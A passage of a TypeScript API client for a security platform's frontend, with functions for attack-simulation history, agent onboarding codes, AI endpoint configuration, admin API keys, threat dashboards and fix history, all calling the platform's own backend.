            body: JSON.stringify({ attackIds })
        });
        if (!response.ok) throw new Error('Failed to run attack simulation');
        return response.json();
    } catch (e) {
        console.error('Failed to run attack simulation:', e);
        return null;
    }
};

export const fetchAttackHistory = async (): Promise<AttackSimulationReport[]> => {
    if (isDemoMode()) {
        return [
            generateMockAttackReport(),
            generateMockAttackReport(['sql-1', 'xss-1']),
            generateMockAttackReport(['cmd-1'])
        ];
    }
    try {
        const response = await fetchWithCredentials(`${API_BASE_URL}/attack/history`);
        if (!response.ok) return [];
        return response.json();
    } catch (e) {
        console.error('Failed to fetch attack history:', e);
        return [];
    }
};

// --- Agent Onboarding API ---

export const createAgentOnboardingCode = async (payload: {
    hostname?: string;
    expectedTags?: string[];
    ttlMinutes?: number;
    maxUses?: number;
}) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/agent-onboarding/codes`, {
        method: 'POST',
        body: JSON.stringify(payload || {})
    });
    if (!response.ok) {
        const text = await response.text();
        throw new Error(text || 'Failed to create onboarding code');
    }
    return response.json();
};

export const exchangeAgentOnboardingCode = async (payload: {
    onboardingCode: string;
    hostname: string;
    platform: string;
    mac?: string;
}) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/agent-onboarding/exchange`, {
        method: 'POST',
        body: JSON.stringify(payload)
    });
    if (!response.ok) {
        const text = await response.text();
        throw new Error(text || 'Failed to exchange onboarding code');
    }
    return response.json();
};

export const revokeAgentCredential = async (agentId: string, reason?: string) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/agent-onboarding/revoke/${agentId}`, {
        method: 'POST',
        body: JSON.stringify({ reason })
    });
    if (!response.ok) {
        const text = await response.text();
        throw new Error(text || 'Failed to revoke agent credential');
    }
    return response.json();
};

export const fetchAgentOnboardingCodes = async (status?: 'active' | 'used' | 'expired' | 'revoked', limit: number = 50) => {
    const qs = new URLSearchParams();
    qs.set('limit', String(limit));
    if (status) qs.set('status', status);
    const response = await fetchWithCredentials(`${API_BASE_URL}/agent-onboarding/codes?${qs.toString()}`);
    if (!response.ok) {
        return [];
    }
    const data = await response.json();
    return data?.data || [];
};

export const fetchRegisteredAgents = async () => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/agent-onboarding/agents`);
    if (!response.ok) {
        return [];
    }
    const data = await response.json();
    return data?.data || [];
};

// --- AI Endpoints API ---

export const fetchAIEndpoints = async () => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/ai-endpoints`);
    if (!response.ok) {
        throw new Error(`FG-AI-ENDPOINTS-LIST-${response.status}`);
    }
    const data = await response.json();
    return data?.endpoints || [];
};

export const createAIEndpoint = async (payload: {
    name: string;
    url: string;
    modelName?: string;
    apiKey?: string;
    type?: 'ollama' | 'openai' | 'custom';
    priority?: number;
    timeout?: number;
}) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/ai-endpoints`, {
        method: 'POST',
        body: JSON.stringify(payload)
    });
    if (!response.ok) {
        const text = await response.text();
        throw new Error(text || `FG-AI-ENDPOINTS-CREATE-${response.status}`);
    }
    return response.json();
};

export const updateAIEndpoint = async (id: string, payload: Record<string, any>) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/ai-endpoints/${id}`, {
        method: 'PUT',
        body: JSON.stringify(payload)
    });
    if (!response.ok) {
        const text = await response.text();
        throw new Error(text || `FG-AI-ENDPOINTS-UPDATE-${response.status}`);
    }
    return response.json();
};

export const deleteAIEndpoint = async (id: string) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/ai-endpoints/${id}`, {
        method: 'DELETE'
    });
    if (!response.ok) {
        const text = await response.text();
        throw new Error(text || `FG-AI-ENDPOINTS-DELETE-${response.status}`);
    }
    return response.json();
};

export const testAIEndpoint = async (id: string) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/ai-endpoints/${id}/test`, {
        method: 'POST'
    });
    if (!response.ok) {
        const text = await response.text();
        throw new Error(text || `FG-AI-ENDPOINTS-TEST-${response.status}`);
    }
    return response.json();
};

// --- Admin API Keys ---

export const fetchAdminApiKeys = async () => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/admin/api-keys`);
    if (!response.ok) {
        throw new Error(`FG-ADMIN-APIKEYS-LIST-${response.status}`);
    }
    const data = await response.json();
    return data?.keys || [];
};

export const createAdminApiKey = async (name: string) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/admin/api-keys`, {
        method: 'POST',
        body: JSON.stringify({ name })
    });
    if (!response.ok) {
        const text = await response.text();
        throw new Error(text || `FG-ADMIN-APIKEYS-CREATE-${response.status}`);
    }
    return response.json();
};

export const deleteAdminApiKey = async (id: string) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/admin/api-keys/${id}`, {
        method: 'DELETE'
    });
    if (!response.ok) {
        const text = await response.text();
        throw new Error(text || `FG-ADMIN-APIKEYS-DELETE-${response.status}`);
    }
    return response.json();
};

// --- Dashboard / Agents / Devices ---

export const fetchDashboardRulesSummary = async () => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/dashboard/rules/summary`);
    if (!response.ok) {
        throw new Error(`FG-DASHBOARD-RULES-${response.status}`);
    }
    const data = await response.json();
    return data?.data || { totalRules: 0, activeRules: 0, topRules: [] };
};

export const fetchRecentAgentThreats = async (limit: number = 50) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/agents/threats/recent?limit=${limit}`);
    if (!response.ok) {
        throw new Error(`FG-AGENT-THREATS-${response.status}`);
    }
    const data = await response.json();
    return data?.threats || [];
};

export const fetchDeviceEvents = async (deviceId: string, limit: number = 100) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/devices/${encodeURIComponent(deviceId)}/events?limit=${limit}`);
    if (!response.ok) {
        throw new Error(`FG-DEVICE-EVENTS-${response.status}`);
    }
    const data = await response.json();
    return data?.events || [];
};

// --- Fix History ---

export const fetchFixHistory = async (limit: number = 50) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/fix-history?limit=${limit}`);
    if (!response.ok) {
        throw new Error(`FG-FIX-HISTORY-${response.status}`);
    }
    const data = await response.json();
    return data?.data || [];
};

export const fetchFixHistoryDetail = async (id: string) => {
    const response = await fetchWithCredentials(`${API_BASE_URL}/fix-history/${encodeURIComponent(id)}`);
    if (!response.ok) {
        throw new Error(`FG-FIX-HISTORY-DETAIL-${response.status}`);
    }
    const data = await response.json();
    return data?.data || null;
};
